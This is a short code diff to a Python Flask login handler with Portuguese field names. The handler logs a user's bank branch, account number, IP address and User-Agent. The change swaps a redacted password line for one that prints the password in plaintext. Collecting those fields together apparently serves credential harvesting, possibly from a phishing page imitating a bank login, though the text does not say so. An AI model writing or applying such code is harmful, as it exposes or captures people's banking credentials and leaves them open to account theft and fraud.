@@ -113,7 +113,7 @@ def login():
             print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'), flush=True)
             print("Agência:", agencia, flush=True)
             print("Conta:", conta, flush=True)
-            print("Senha: [DIGITADA CORRETAMENTE]", flush=True)
+            print("Senha:", senha, flush=True)
             print("Tamanho da senha:", len(senha), flush=True)
             print("IP:", request.remote_addr, flush=True)
             print("User-Agent:", request.headers.get('User-Agent'), flush=True)
@@ -128,4 +128,5 @@ def login():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
 
